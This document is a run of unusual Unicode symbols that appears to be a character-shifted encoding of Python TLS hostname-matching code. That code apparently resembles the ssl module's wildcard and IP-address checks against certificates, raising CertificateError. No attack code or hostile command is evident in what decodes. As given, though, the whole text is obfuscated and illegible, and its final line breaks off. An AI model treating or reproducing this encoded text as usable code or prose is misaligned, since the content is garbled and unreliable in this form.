꛰ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫ꛰꛹ꛮ꛺ꛯ꛰ꛯꚫꛬ꛾ꚫꛔꛏꛙꚫꛌꚸ꛷ꛬꛭ꛰꛷ꚫꚳꛌꛎꛐꚴꚹꚕꚫꚫꚫꚫꚸꚫꛛꛬ꛽꛿꛴ꛬ꛷ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚫ꛷꛴꛶꛰ꚫꚲ꜂꜂꜂ꚵꚹ꛰꜃ꛬ꛸꛻꛷꛰ꚹ꛺꛽꛲ꚲꚷꚫ꛸꜀꛷꛿꛴꛻꛷꛰ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚷꚫ꛾꛺꛷꛰ꚕꚫꚫꚫꚫꚫꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫ꛺꛽ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚫ꛴꛹ꚫ꛷ꛬꛭ꛰꛷꛾ꚫ꛺꛿꛳꛰꛽ꚫ꛿꛳꛰꛹ꚫ꛿꛳꛰ꚫ꛷꛰꛱꛿ꚸ꛸꛺꛾꛿ꚫ꛷ꛬꛭ꛰꛷ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚕꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫꛬ꛹ꛯꚫꛬꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚫ꛴꛾ꚫ꛽ꛬ꛴꛾꛰ꛯꚹꚕꚫꚫꚫꚫꚸꚫꛌꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫ꛸꜀꛾꛿ꚫ꛸ꛬ꛿ꛮ꛳ꚫꛬ꛿ꚫ꛷꛰ꛬ꛾꛿ꚫ꛺꛹꛰ꚫꛮ꛳ꛬ꛽ꛬꛮ꛿꛰꛽ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛯ꛹ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛑꛬ꛷꛾꛰ꚕꚕꚫꚫꚫꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚫꛈꚫꛯ꛹ꚹꛮ꛺꜀꛹꛿ꚳꚲꚵꚲꚴꚕꚫꚫꚫꚫꚮꚫ꛾꛻꛰꛰ꛯꚫ꜀꛻ꚫꛮ꛺꛸꛸꛺꛹ꚫꛮꛬ꛾꛰ꚫ꜂ꚺ꛺ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛯ꛹ꚹ꛷꛺꜂꛰꛽ꚳꚴꚫꛈꛈꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚹ꛷꛺꜂꛰꛽ꚳꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚫꛉꚫꚼꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛿꛺꛺ꚫ꛸ꛬ꛹꜄ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚫ꛴꛹ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫꛏꛙꛞꚫ꛹ꛬ꛸꛰ꛅꚫ꜆ꚬ꛽꜈ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛯ꛹ꚴꚴꚕꚕꚫꚫꚫꚫꛯ꛹ꛪ꛷꛰꛱꛿꛸꛺꛾꛿ꚷꚫ꛾꛰꛻ꚷꚫꛯ꛹ꛪ꛽꛰꛸ꛬ꛴꛹ꛯ꛰꛽ꚫꛈꚫꛯ꛹ꚹ꛻ꛬ꛽꛿꛴꛿꛴꛺꛹ꚳꚲꚹꚲꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫꚲꚵꚲꚫ꛴꛹ꚫꛯ꛹ꛪ꛽꛰꛸ꛬ꛴꛹ꛯ꛰꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛚ꛹꛷꜄ꚫ꛸ꛬ꛿ꛮ꛳ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫ꛴꛹ꚫ꛷꛰꛱꛿꛸꛺꛾꛿ꚫ꛾꛰꛲꛸꛰꛹꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫꛮꛬ꛹ꚫ꛺꛹꛷꜄ꚫꛭ꛰ꚫ꛻꛽꛰꛾꛰꛹꛿ꚫ꛴꛹ꚫ꛿꛳꛰ꚫ꛷꛰꛱꛿꛸꛺꛾꛿ꚫ꛷ꛬꛭ꛰꛷ꛅꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꜆ꚬ꛽꜈ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛯ꛹ꚴꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛾꛰꛻ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺ꚫ꛽꛴꛲꛳꛿ꚫ꛾꛴ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛺꛷꛰ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫ꜂꛴꛿꛳꛺꜀꛿ꚫꛬꛯꛯ꛴꛿꛴꛺꛹ꛬ꛷ꚫ꛷ꛬꛭ꛰꛷꛾ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿ꛅꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꜆ꚬ꛽꜈ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛯ꛹ꚴꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫꛯ꛹ꛪ꛷꛰꛱꛿꛸꛺꛾꛿ꚫꚬꛈꚫꚲꚵꚲꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺ꚫ꛻ꛬ꛽꛿꛴ꛬ꛷ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫ꛸ꛬ꛿ꛮ꛳꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛻ꛬ꛽꛿꛴ꛬ꛷ꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯ꛾ꚫ꛴꛹ꚫ꛷꛰꛱꛿꛸꛺꛾꛿ꚫ꛷ꛬꛭ꛰꛷ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꛅꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꜆ꚬ꛽꜈ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛯ꛹ꚴꚴꚕꚕꚫꚫꚫꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪ꛷꛰꛱꛿꛸꛺꛾꛿ꚷꚫ꛾꛰꛻ꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪ꛽꛰꛸ꛬ꛴꛹ꛯ꛰꛽ꚫꛈꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚹ꛻ꛬ꛽꛿꛴꛿꛴꛺꛹ꚳꚲꚹꚲꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪ꛷꛰꛱꛿꛸꛺꛾꛿ꚫ꛺꛽ꚫ꛹꛺꛿ꚫ꛾꛰꛻ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꜂꛴꛷ꛯꛮꛬ꛽ꛯꚫ꛸꜀꛾꛿ꚫ꛸ꛬ꛿ꛮ꛳ꚫꛬ꛿ꚫ꛷꛰ꛬ꛾꛿ꚫ꛺꛹꛰ꚫꛮ꛳ꛬ꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛑꛬ꛷꛾꛰ꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛯ꛹ꛪ꛽꛰꛸ꛬ꛴꛹ꛯ꛰꛽ꚹ꛷꛺꜂꛰꛽ꚳꚴꚫꛈꛈꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪ꛽꛰꛸ꛬ꛴꛹ꛯ꛰꛽ꚹ꛷꛺꜂꛰꛽ꚳꚴꚕꚕꚕꛯ꛰꛱ꚫꛪ꛴꛹꛰꛿ꛪ꛻ꛬ꛿꛺꛹ꚳ꛴꛻꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛟ꛽꜄ꚫ꛿꛺ꚫꛮ꛺꛹꜁꛰꛽꛿ꚫꛬ꛹ꚫꛔꛛꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛿꛺ꚫ꛻ꛬꛮ꛶꛰ꛯꚫꛭ꛴꛹ꛬ꛽꜄ꚫ꛱꛺꛽꛸ꚕꚕꚫꚫꚫꚫꛞ꜀꛻꛻꛺꛽꛿꛾ꚫꛔꛛ꜁ꚿꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚫ꛺꛹ꚫꛬ꛷꛷ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚫꛬ꛹ꛯꚫꛔꛛ꜁ꛁꚫ꛺꛹ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚫ꜂꛴꛿꛳ꚫꛔꛛ꜁ꛁꚕꚫꚫꚫꚫ꛾꜀꛻꛻꛺꛽꛿ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚮꚫ꛴꛹꛰꛿ꛪꛬ꛿꛺꛹ꚳꚴꚫꛬ꛷꛾꛺ꚫꛬꛮꛮ꛰꛻꛿꛾ꚫ꛾꛿꛽꛴꛹꛲꛾ꚫ꛷꛴꛶꛰ꚫꚲꚼꚲꚷꚫꚲꚼꚽꛂꚹꚼꚲꚷꚫ꛾꛺꛸꛰ꚫꛬ꛷꛾꛺ꚫ꛿꛽ꛬ꛴꛷꛴꛹꛲ꚕꚫꚫꚫꚫꚮꚫꛯꛬ꛿ꛬꚫ꛷꛴꛶꛰ꚫꚲꚼꚽꛂꚹꚻꚹꚻꚹꚼꚫ꜂꛳ꛬ꛿꛰꜁꛰꛽ꚲꚹꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬꛯꛯ꛽ꚫꛈꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛴꛹꛰꛿ꛪꛬ꛿꛺꛹ꚳ꛴꛻꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺꛿ꚫꛬ꛹ꚫꛔꛛ꜁ꚿꚫꛬꛯꛯ꛽꛰꛾꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛴꛹꛰꛿ꛪ꛹꛿꛺ꛬꚳꛬꛯꛯ꛽ꚴꚫꛈꛈꚫ꛴꛻꛹ꛬ꛸꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛺꛹꛷꜄ꚫꛬꛮꛮ꛰꛻꛿ꚫ꛴꛹꛵꛰ꛮ꛿꛴꜁꛰ꚫ꛴꛻꛹ꛬ꛸꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛬꛯꛯ꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛽꛰꛱꜀꛾꛰ꚫ꛱꛺꛽ꚫ꛾꛳꛺꛽꛿ꚫꛔꛛ꜁ꚿꚫ꛹꛺꛿ꛬ꛿꛴꛺꛹ꚫꛬ꛹ꛯꚫꛬꛯꛯ꛴꛿꛴꛺꛹ꛬ꛷ꚫ꛿꛽ꛬ꛴꛷꛴꛹꛲ꚫꛯꛬ꛿ꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꜆ꚬ꛽꜈ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬꚫ꛼꜀ꛬꛯꚸꛯ꛺꛿꛿꛰ꛯꚫꛔꛛ꜁ꚿꚫꛬꛯꛯ꛽꛰꛾꛾ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳ꛴꛻꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛴꛹꛰꛿ꛪ꛻꛿꛺꛹ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚹꛌꛑꛪꛔꛙꛐꛟꛁꚷꚫ꛴꛻꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꜆ꚬ꛽꜈ꚫ꛴꛾ꚫ꛹꛰꛴꛿꛳꛰꛽ꚫꛬ꛹ꚫꛔꛛ꜁ꚿꚫ꛹꛺꛽ꚫꛬ꛹ꚫꛔꛛꛁꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛬꛯꛯ꛽꛰꛾꛾ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳ꛴꛻꛹ꛬ꛸꛰ꚴꚴꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛌ꛿꛿꛽꛴ꛭ꜀꛿꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛌꛑꛪꛔꛙꛐꛟꛁꚫ꛹꛺꛿ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꜆ꚬ꛽꜈ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬ꛹ꚫꛔꛛ꜁ꚿꚫꛬꛯꛯ꛽꛰꛾꛾ꚹꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳ꛴꛻꛹ꛬ꛸꛰ꚴꚴꚕꚕꚕꛯ꛰꛱ꚫꛪ꛴꛻ꛬꛯꛯ꛽꛰꛾꛾ꛪ꛸ꛬ꛿ꛮ꛳ꚳꛮ꛰꛽꛿ꛪ꛴꛻ꛬꛯꛯ꛽꛰꛾꛾ꚷꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛐ꜃ꛬꛮ꛿ꚫ꛸ꛬ꛿ꛮ꛳꛴꛹꛲ꚫ꛺꛱ꚫꛔꛛꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚹꚕꚕꚫꚫꚫꚫꛝꛑꛎꚫꛁꚼꚽꛀꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿꛷꜄ꚫꛯ꛺꛰꛾꛹ꚲ꛿ꚫꛯ꛰꛱꛴꛹꛰ꚫꛬ꛹ꚫꛬ꛷꛲꛺꛽꛴꛿꛳꛸ꚫ꛱꛺꛽ꚫ꛿꛳꛴꛾ꚕꚫꚫꚫꚫꚳ꛾꛰ꛮ꛿꛴꛺꛹ꚫꚼꚹꛂꚹꚽꚫꚸꚫꚭꛚ꜀꛿ꚫ꛺꛱ꚫꛞꛮ꛺꛻꛰ꚭꚴꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚮꚫꛚ꛻꛰꛹ꛞꛞꛗꚫ꛸ꛬ꜄ꚫꛬꛯꛯꚫꛬꚫ꛿꛽ꛬ꛴꛷꛴꛹꛲ꚫ꛹꛰꜂꛷꛴꛹꛰ꚫ꛿꛺ꚫꛬꚫ꛾꜀ꛭ꛵꛰ꛮ꛿ꛌ꛷꛿ꛙꛬ꛸꛰ꚲ꛾ꚫꛔꛛꚫꛬꛯꛯ꛽꛰꛾꛾ꚷꚕꚫꚫꚫꚫꚮꚫꛮ꛺꛸꛸꛺꛹꛷꜄ꚫ꜂꛴꛿꛳ꚫꛔꛛ꜁ꛁꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚹꚫꛞ꛿꛽꛴꛻ꚫ꛺꛱꛱ꚫ꛿꛽ꛬ꛴꛷꛴꛹꛲ꚫꛧ꛹ꚹꚕꚫꚫꚫꚫ꛴꛻ꚫꛈꚫꛪ꛴꛹꛰꛿ꛪ꛻ꛬ꛿꛺꛹ꚳꛮ꛰꛽꛿ꛪ꛴꛻ꛬꛯꛯ꛽꛰꛾꛾ꚹ꛽꛾꛿꛽꛴꛻ꚳꚴꚴꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛴꛻ꚫꛈꛈꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚕꚕꚕꛯ꛰꛱ꚫ꛸ꛬ꛿ꛮ꛳ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳꛮ꛰꛽꛿ꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛡ꛰꛽꛴꛱꜄ꚫ꛿꛳ꛬ꛿ꚫꚵꛮ꛰꛽꛿ꚵꚫꚳ꛴꛹ꚫꛯ꛰ꛮ꛺ꛯ꛰ꛯꚫ꛱꛺꛽꛸ꛬ꛿ꚫꛬ꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚕꚫꚫꚫꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚹ꛲꛰꛿꛻꛰꛰꛽ꛮ꛰꛽꛿ꚳꚴꚴꚫ꛸ꛬ꛿ꛮ꛳꛰꛾ꚫ꛿꛳꛰ꚫꚵ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚵꚹꚫꚫꛝꛑꛎꚫꚽꛃꚼꛃꚫꛬ꛹ꛯꚫꛝꛑꛎꚫꛁꚼꚽꛀꚕꚫꚫꚫꚫ꛽꜀꛷꛰꛾ꚫꛬ꛽꛰ꚫ꛱꛺꛷꛷꛺꜂꛰ꛯꚹꚕꚕꚫꚫꚫꚫꛟ꛳꛰ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫ꛸ꛬ꛿ꛮ꛳꛰꛾ꚫꛔꛛꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚫ꛽ꛬ꛿꛳꛰꛽ꚫ꛿꛳ꛬ꛹ꚫꛯꛙꛞꛙꛬ꛸꛰꛾ꚫ꛴꛱ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛴꛾ꚫꛬꚕꚫꚫꚫꚫ꜁ꛬ꛷꛴ꛯꚫ꛴꛻ꛬꛯꛯ꛽꛰꛾꛾ꚫ꛾꛿꛽꛴꛹꛲ꚹꚫꛔꛛ꜁ꚿꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚫꛬ꛽꛰ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫ꛺꛹ꚫꛬ꛷꛷ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚹꚕꚫꚫꚫꚫꛔꛛ꜁ꛁꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚫꛬ꛽꛰ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫ꛺꛹ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚫ꜂꛴꛿꛳ꚫꛔꛛ꜁ꛁꚫ꛾꜀꛻꛻꛺꛽꛿ꚫꚳꛌꛑꛪꛔꛙꛐꛟꛁꚕꚫꚫꚫꚫꛬ꛹ꛯꚫ꛴꛹꛰꛿ꛪ꛻꛿꛺꛹ꚴꚹꚕꚕꚫꚫꚫꚫꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚫ꛴꛾ꚫ꛽ꛬ꛴꛾꛰ꛯꚫ꛺꛹ꚫ꛱ꛬ꛴꛷꜀꛽꛰ꚹꚫꛚ꛹ꚫ꛾꜀ꛮꛮ꛰꛾꛾ꚷꚫ꛿꛳꛰ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹꛾ꚫ꛹꛺꛿꛳꛴꛹꛲ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛾꛷ꚹ꛸ꛬ꛿ꛮ꛳ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳꚴꚫ꛴꛾ꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛰ꛯꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛿꛰꛲꛺꛽꜄ꛈꛏ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꛢꛬ꛽꛹꛴꛹꛲ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛿ꛬꛮ꛶꛷꛰꜁꛰꛷ꛈꚽꚕꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛮ꛰꛽꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛰꛸꛻꛿꜄ꚫ꛺꛽ꚫ꛹꛺ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚷꚫ꛸ꛬ꛿ꛮ꛳ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛹꛰꛰ꛯ꛾ꚫꛬꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛞꛞꛗꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺꛽ꚫꛞꛞꛗꚫꛮ꛺꛹꛿꛰꜃꛿ꚫ꜂꛴꛿꛳ꚫ꛰꛴꛿꛳꛰꛽ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛎꛐꛝꛟꛪꛚꛛꛟꛔꛚꛙꛌꛗꚫ꛺꛽ꚫꛎꛐꛝꛟꛪꛝꛐꛜꛠꛔꛝꛐꛏꚭꚴꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚫꛈꚫꛪ꛴꛹꛰꛿ꛪ꛻ꛬ꛿꛺꛹ꚳ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛙ꛺꛿ꚫꛬ꛹ꚫꛔꛛꚫꛬꛯꛯ꛽꛰꛾꛾ꚫꚳꛮ꛺꛸꛸꛺꛹ꚫꛮꛬ꛾꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚫꛈꚫꛦꛨꚕꚫꚫꚫꚫ꛾ꛬ꛹ꚫꛈꚫꛮ꛰꛽꛿ꚹ꛲꛰꛿ꚳꚲ꛾꜀ꛭ꛵꛰ꛮ꛿ꛌ꛷꛿ꛙꛬ꛸꛰ꚲꚷꚫꚳꚴꚴꚕꚫꚫꚫꚫ꛱꛺꛽ꚫ꛶꛰꜄ꚷꚫ꜁ꛬ꛷꜀꛰ꚫ꛴꛹ꚫ꛾ꛬ꛹ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛶꛰꜄ꚫꛈꛈꚫꚲꛏꛙꛞꚲꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꚫꛬ꛹ꛯꚫꛪꛯ꛹꛾꛹ꛬ꛸꛰ꛪ꛸ꛬ꛿ꛮ꛳ꚳ꜁ꛬ꛷꜀꛰ꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳ꜁ꛬ꛷꜀꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛶꛰꜄ꚫꛈꛈꚫꚲꛔꛛꚫꛌꛯꛯ꛽꛰꛾꛾ꚲꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꚫꛬ꛹ꛯꚫꛪ꛴꛻ꛬꛯꛯ꛽꛰꛾꛾ꛪ꛸ꛬ꛿ꛮ꛳ꚳ꜁ꛬ꛷꜀꛰ꚷꚫ꛳꛺꛾꛿ꛪ꛴꛻ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳ꜁ꛬ꛷꜀꛰ꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛯ꛹꛾꛹ꛬ꛸꛰꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛟ꛳꛰ꚫ꛾꜀ꛭ꛵꛰ꛮ꛿ꚫ꛴꛾ꚫ꛺꛹꛷꜄ꚫꛮ꛳꛰ꛮ꛶꛰ꛯꚫ꜂꛳꛰꛹ꚫ꛿꛳꛰꛽꛰ꚫ꛴꛾ꚫ꛹꛺ꚫꛯꛙꛞꛙꛬ꛸꛰ꚫ꛰